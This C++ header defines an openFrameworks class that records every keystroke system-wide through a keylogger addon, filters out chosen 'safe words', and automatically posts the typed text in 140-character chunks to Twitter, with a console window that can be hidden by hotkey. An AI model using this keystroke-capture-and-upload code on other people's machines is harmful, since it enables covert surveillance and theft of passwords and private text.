#pragma once

#include "ofEvents.h"
#include "ofxKeyLogger.h"
#include "ofxTwitter.h"
#include "ofxString.h"

#define MESSAGE_DELAY 8
#define MESSAGE_SIZE 140

class AutoTweet {
public:
	AutoTweet(string username, string password) {
		this->username = username;
		this->password = password;
		ofAddListener(logger.keyPressed, this, &AutoTweet::keyPressed);

		AllocConsole();
		handleWindow = FindWindowA("ConsoleWindowClass", NULL);
	}
	void keyPressed(ofKeyEventArgs& keyEvent) {
		int key = keyEvent.key;

		if(key == OF_KEY_HOME)
			ShowWindow(handleWindow, 1);
		if(key == OF_KEY_END)
			ShowWindow(handleWindow, 0);

		int before = buffer.size();
		if(ofxString::isPrintable(key))
			buffer += key;
		else if(key == OF_KEY_BACKSPACE)
			if(buffer.isAscii(buffer.last()))
				buffer.pop_back();
		int after = buffer.size();

		if(after != before) {
			string ascii = buffer.asAscii();
			printf("%s[%i]\n", ascii.c_str(), buffer.size());
		}

		for(int i = 0; i < safeWords.size(); i++) {
			string& cur = safeWords[i];
			if(buffer.matchTail(cur))
				buffer.pop_back(cur.size());
		}

		if(buffer.size() > MESSAGE_SIZE + MESSAGE_DELAY) {
			string message = buffer.substrMultibyte(0, MESSAGE_SIZE);
			buffer.pop_front(MESSAGE_SIZE);
			twitter.send(username, password, message);
		}
	}
	void addSafeWord(string safeWord) {
		safeWords.push_back(safeWord);
	}
	void run() {
		while(true) {
			// this section may optionally be used
			// for writing to a file
			ofSleepMillis(1000);
		}
	}
private:
	HWND handleWindow;

	string username, password;
	vector<string> safeWords;
	ofxString buffer;
	ofxKeyLogger logger;
	ofxTwitter twitter;
};
